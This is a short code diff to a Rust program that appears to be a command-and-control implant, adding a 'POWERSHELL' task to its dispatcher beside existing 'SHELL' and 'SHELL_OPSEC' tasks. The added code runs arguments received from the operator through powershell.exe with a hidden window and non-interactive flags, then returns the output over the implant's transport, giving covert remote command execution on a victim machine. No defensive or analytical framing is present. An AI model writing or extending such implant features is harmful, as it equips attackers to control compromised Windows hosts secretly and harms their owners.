@@ -1440,6 +1440,13 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
         "SHELL" => {
             t.send_result(task.id, &shell(&task.args), "");
         }
+        "POWERSHELL" => {
+            let ps_cmd = format!(
+                "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"{}\" 2>&1",
+                &task.args
+            );
+            t.send_result(task.id, &shell(&ps_cmd), "");
+        }
         "SHELL_OPSEC" => {
             #[cfg(target_os = "windows")]
             t.send_result(task.id, &shell_opsec(&task.args), "");
